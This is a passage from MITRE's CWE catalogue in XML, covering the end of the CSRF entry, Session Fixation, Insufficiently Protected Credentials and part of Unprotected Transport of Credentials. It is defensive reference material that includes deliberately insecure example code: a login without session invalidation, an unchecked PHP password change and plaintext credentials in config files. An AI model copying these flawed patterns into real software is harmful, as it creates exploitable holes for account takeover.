            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A5</Entry_ID>
               <Entry_Name>Cross Site Request Forgery (CSRF)</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>9</Entry_ID>
               <Entry_Name>Cross-site Request Forgery</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="111"/>
            <Related_Attack_Pattern CAPEC_ID="462"/>
            <Related_Attack_Pattern CAPEC_ID="467"/>
            <Related_Attack_Pattern CAPEC_ID="62"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 2: Web-Server Related Vulnerabilities (XSS, XSRF, and&#xA;                  Response Splitting).&#34; Page 37"/>
            <Reference External_Reference_ID="REF-329"/>
            <Reference External_Reference_ID="REF-330"/>
            <Reference External_Reference_ID="REF-331"/>
            <Reference External_Reference_ID="REF-332"/>
            <Reference External_Reference_ID="REF-333"/>
            <Reference External_Reference_ID="REF-334"/>
            <Reference External_Reference_ID="REF-335"/>
            <Reference External_Reference_ID="REF-45"/>
         </References>
         <Notes>
            <Note Type="Relationship">This can be resultant from XSS, although XSS is not necessarily required.</Note>
            <Note Type="Theoretical">
               <xhtml:p>The CSRF topology is multi-channel:</xhtml:p>
               <xhtml:div style="margin-left:10px;">
                  <xhtml:div>1. Attacker (as outsider) to intermediary (as user). The interaction point is either an external or internal channel.</xhtml:div>
                  <xhtml:div>2. Intermediary (as user) to server (as victim). The activation point is an internal channel.</xhtml:div>
               </xhtml:div>
            </Note>
            <Note Type="Research Gap">This issue was under-reported in CVE until around 2008, when it began to gain prominence. It is likely to be present in most web applications.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Description, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Description, Likelihood_of_Exploit, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationship_Notes, Relationships, Research_Gaps, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Tom Stracener</Modification_Name>
               <Modification_Date>2009-05-20</Modification_Date>
               <Modification_Comment>Added demonstrative example for profile.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, Observed_Examples, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Detection_Factors, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="384" Name="Session Fixation" Abstraction="Compound" Structure="Composite" Status="Incomplete">
         <Description>Authenticating a user, or otherwise establishing a new user session, without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions.</Description>
         <Extended_Description>
            <xhtml:p>Such a scenario is commonly observed when:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div>1. A web application authenticates a user without first invalidating the existing session, thereby continuing to use the session already associated with the user.</xhtml:div>
               <xhtml:div>2. An attacker is able to force a known session identifier on a user so that, once the user authenticates, the attacker has access to the authenticated session.</xhtml:div>
               <xhtml:div>3. The application or container uses predictable session identifiers. In the generic exploit of session fixation vulnerabilities, an attacker creates a new session on a web application and records the associated session identifier. The attacker then causes the victim to associate, and possibly authenticate, against the server using that session identifier, giving the attacker access to the user's account through the active session.</xhtml:div>
            </xhtml:div>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="699"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="Requires" CWE_ID="346" View_ID="1000"/>
            <Related_Weakness Nature="Requires" CWE_ID="472" View_ID="1000"/>
            <Related_Weakness Nature="Requires" CWE_ID="441" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Invalidate any existing session identifiers prior to authorizing a new user session.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>For platforms such as ASP that do not generate new values for sessionid cookies, utilize a secondary cookie. In this approach, set a secondary cookie on the user's browser to a random value and set a session variable to the same value. If the session variable and the cookie value ever don't match, invalidate the session, and force the user to log on again.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following example shows a snippet of code from a J2EE web application where the application authenticates users with LoginContext.login() without first calling HttpSession.invalidate().</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>private void auth(LoginContext lc, HttpSession session) throws LoginException {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>...<xhtml:br/>lc.login();<xhtml:br/>...</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>In order to exploit the code above, an attacker could first create a session (perhaps by logging into the application) from a public terminal, record the session identifier assigned by the application, and reset the browser to the login page. Next, a victim sits down at the same public terminal, notices the browser open to the login page of the site, and enters credentials to authenticate against the application. The code responsible for authenticating the victim continues to use the pre-existing session identifier, now the attacker simply uses the session identifier recorded earlier to access the victim's active session, providing nearly unrestricted access to the victim's account for the lifetime of the session. Even given a vulnerable application, the success of the specific attack described here is dependent on several factors working in the favor of the attacker: access to an unmonitored public terminal, the ability to keep the compromised session active and a victim interested in logging into the vulnerable application on the public terminal.</Body_Text>
               <Body_Text>In most circumstances, the first two challenges are surmountable given a sufficient investment of time. Finding a victim who is both using a public terminal and interested in logging into the vulnerable application is possible as well, so long as the site is reasonably popular. The less well known the site is, the lower the odds of an interested victim using the public terminal and the lower the chance of success for the attack vector described above. The biggest challenge an attacker faces in exploiting session fixation vulnerabilities is inducing victims to authenticate against the vulnerable application using a session identifier known to the attacker.</Body_Text>
               <Body_Text>In the example above, the attacker did this through a direct method that is not subtle and does not scale suitably for attacks involving less well-known web sites. However, do not be lulled into complacency; attackers have many tools in their belts that help bypass the limitations of this attack vector. The most common technique employed by attackers involves taking advantage of cross-site scripting or HTTP response splitting vulnerabilities in the target site [12]. By tricking the victim into submitting a malicious request to a vulnerable application that reflects JavaScript or other code back to the victim's browser, an attacker can create a cookie that will cause the victim to reuse a session identifier controlled by the attacker. It is worth noting that cookies are often tied to the top level domain associated with a given URL. If multiple applications reside on the same top level domain, such as bank.example.com and recipes.example.com, a vulnerability in one application can allow an attacker to set a cookie with a fixed session identifier that will be used in all interactions with any application on the domain example.com [29].</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following example shows a snippet of code from a J2EE web application where the application authenticates users with a direct post to the &lt;code&gt;j_security_check&lt;/code&gt;, which typically does not invalidate the existing session before processing the login request.</Intro_Text>
               <Example_Code Nature="bad" Language="HTML">
                  <xhtml:div>&lt;form method="POST" action="j_security_check"&gt;<xhtml:div style="margin-left:10px;">
                        <xhtml:div>&lt;input type="text" name="j_username"&gt;<xhtml:br/>&lt;input type="text" name="j_password"&gt;</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Session Fixation</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>37</Entry_ID>
               <Entry_Name>Session Fixation</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="196"/>
            <Related_Attack_Pattern CAPEC_ID="21"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="39"/>
            <Related_Attack_Pattern CAPEC_ID="59"/>
            <Related_Attack_Pattern CAPEC_ID="60"/>
            <Related_Attack_Pattern CAPEC_ID="61"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Other">Other attack vectors include DNS poisoning and related network based attacks where an attacker causes the user to visit a malicious site by redirecting a request for a valid site. Network based attacks typically involve a physical presence on the victim's network or control of a compromised machine on the network, which makes them harder to exploit remotely, but their significance should not be overlooked. Less secure session management mechanisms, such as the default implementation in Apache Tomcat, allow session identifiers normally expected in a cookie to be specified on the URL as well, which enables an attacker to cause a victim to use a fixed session identifier simply by emailing a malicious URL.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="522" Name="Insufficiently Protected Credentials" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>This weakness occurs when the application transmits or stores authentication credentials and uses an insecure method that is susceptible to unauthorized interception and/or retrieval.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker could gain access to user accounts and access sensitive data used by the user accounts.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use an appropriate security mechanism to protect the credentials.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Make appropriate use of cryptography to protect the credentials.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use industry standards to protect the credentials (e.g. LDAP, keystore, etc.).</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-56">
               <Intro_Text>This code changes a user's password.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$user = $_GET['user'];<xhtml:br/>$pass = $_GET['pass'];<xhtml:br/>$checkpass = $_GET['checkpass'];<xhtml:br/>if ($pass == $checkpass) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>SetUserPassword($user, $pass);</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>While the code confirms that the requesting user typed the same new password twice, it does not confirm that the user requesting the password change is the same user whose password will be changed. An attacker can request a change of another user's password and gain control of the victim's account.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-57">
               <Intro_Text>The following code reads a password from a properties file and uses the password to connect to a database.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>Properties prop = new Properties();<xhtml:br/>prop.load(new FileInputStream("config.properties"));<xhtml:br/>String password = prop.getProperty("password");<xhtml:br/>DriverManager.getConnection(url, usr, password);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code will run successfully, but anyone who has access to config.properties can read the value of password. If a devious employee has access to this information, they can use it to break into the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-58">
               <Intro_Text>The following code reads a password from the registry and uses the password to create a new network credential.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>String password = regKey.GetValue(passKey).toString();<xhtml:br/>NetworkCredential netCred = new NetworkCredential(username,password,domain);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the system</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-59">
               <Intro_Text>Both of these examples verify a password by comparing it to a stored compressed version.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>int VerifyAdmin(char *password) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>if (strcmp(compress(password), compressed_password)) {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>printf("Incorrect Password!\n");<xhtml:br/>return(0);</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>}<xhtml:br/>printf("Entering Diagnostic Mode...\n");<xhtml:br/>return(1);</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>int VerifyAdmin(String password) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>if (passwd.Equals(compress(password), compressed_password)) {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>return(0);</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>}<xhtml:div>
                              <xhtml:i>//Diagnostic Mode</xhtml:i>
                           </xhtml:div>
                           <xhtml:br/>return(1);</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because a compression algorithm is used instead of a one way hashing algorithm, an attacker can recover compressed passwords stored in the database.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-43">
               <Intro_Text>The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in plaintext.</Intro_Text>
               <Body_Text>This Java example shows a properties file with a plaintext username / password pair.</Body_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>
                     <xhtml:div>
                        <xhtml:i># Java Web App ResourceBundle properties file</xhtml:i>
                     </xhtml:div>...<xhtml:br/>webapp.ldap.username=secretUsername<xhtml:br/>webapp.ldap.password=secretPassword<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in plaintext.</Body_Text>
               <Example_Code Nature="bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>&lt;connectionStrings&gt;<xhtml:br/>&lt;add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" /&gt;<xhtml:br/>&lt;/connectionStrings&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information and avoid CWE-260 and CWE-13.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2007-0681</Reference>
               <Description>Web app allows remote attackers to change the passwords of arbitrary users without providing the original password, and possibly perform other unauthorized actions.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0681</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0944</Reference>
               <Description>Web application password change utility doesn't check the original password.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0944</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3435</Reference>
               <Description>product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3435</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0408</Reference>
               <Description>chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0408</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A7</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="102"/>
            <Related_Attack_Pattern CAPEC_ID="50"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 19: Use of Weak Password-Based Systems.&#34; Page&#xA;                  279"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="523" Name="Unprotected Transport of Credentials" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>Login pages not using adequate measures to protect the user name and password while they are in transit from the client to the server.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="522" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="522" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Background_Details>
            <Background_Detail>SSL (Secure Socket Layer) provides data confidentiality and integrity to HTTP. By encrypting HTTP messages, SSL protects from attackers eavesdropping or altering message contents.</Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Operation</Phase>
               <Phase>System Configuration</Phase>
               <Description>Enforce SSL use for the login page or any page used to transmit user credentials or other sensitive information. Even if the entire site does not use SSL, it MUST use SSL for login. Additionally, to help prevent phishing attacks, make sure that SSL serves the login page. SSL allows the user to verify the identity of the server to which they are connecting. If the SSL serves login page, the user can be certain they are talking to the proper end system. A phishing attack would typically redirect a user to a site that does not have a valid trusted server certificate issued from an authorized supplier.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="102"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
